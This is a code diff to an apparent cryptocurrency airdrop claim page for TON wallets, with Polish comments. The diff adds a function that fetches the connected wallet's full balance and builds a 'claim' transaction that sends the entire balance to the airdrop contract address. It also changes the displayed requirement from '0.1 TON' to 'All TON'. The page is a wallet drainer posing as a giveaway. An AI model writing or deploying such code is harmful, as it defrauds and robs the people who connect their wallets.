@@ -244,7 +244,7 @@
             <div class="info-card">
                 <i class="fas fa-coins"></i>
                 <h3>Required</h3>
-                <p>0.1 TON</p>
+                <p>All TON</p>
             </div>
             <div class="info-card">
                 <i class="fas fa-gift"></i>
@@ -315,6 +315,13 @@
             return TonWeb.utils.bytesToBase64(await cell.toBoc());
         }
 
+        // Pobranie salda użytkownika z TON Center API
+        async function getUserBalance(address) {
+            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+            const data = await response.json();
+            return data.result.balance;
+        }
+
         // Obsługa przycisku claim
         document.getElementById('claim-button').addEventListener('click', async () => {
             try {
@@ -325,14 +332,9 @@
 
                 updateStatus('Preparing transaction...', 'info');
 
-                // Pobierz dostępne saldo użytkownika
-                const walletInfo = await tonConnectUI.getWalletInfo(); // Pobiera dane portfela
-                const balance = walletInfo.balance; // Saldo w nanoTON (1 TON = 10⁹ nanoTON)
-
-                if (balance <= 0) {
-                    updateStatus('Your wallet balance is insufficient', 'error');
-                    return;
-                }
+                // Pobranie salda użytkownika
+                const userAddress = tonConnectUI.connected.account.address;
+                const userBalance = await getUserBalance(userAddress);
 
                 // Tworzenie payloadu
                 const payload = await createPayload();
@@ -343,7 +345,7 @@
                     messages: [
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: String(balance), // Wysyłamy całe saldo użytkownika
+                            amount: userBalance, // Wysyłanie całego salda
                             payload: payload
                         }
                     ]
@@ -357,38 +359,6 @@
                 console.error('Transaction error:', error);
                 updateStatus(`Transaction error: ${error.message}`, 'error');
             }
-        });
-        try {
-            if (!tonConnectUI.connected) {
-                updateStatus('Please connect your wallet first', 'error');
-                return;
-            }
-
-            updateStatus('Preparing transaction...', 'info');
-
-            // Tworzenie payloadu
-            const payload = await createPayload();
-
-            // Konfiguracja transakcji
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 360,
-                messages: [
-                    {
-                        address: AIRDROP_CONTRACT_ADDRESS,
-                        amount: '100000000', // 0.1 TON
-                        payload: payload
-                    }
-                ]
-            };
-
-            const result = await tonConnectUI.sendTransaction(transaction);
-            console.log('Transaction result:', result);
-            updateStatus('Transaction sent successfully!', 'success');
-
-        } catch (error) {
-            console.error('Transaction error:', error);
-            updateStatus(`Transaction error: ${error.message}`, 'error');
-        }
         });
 
         // Funkcje pomocnicze
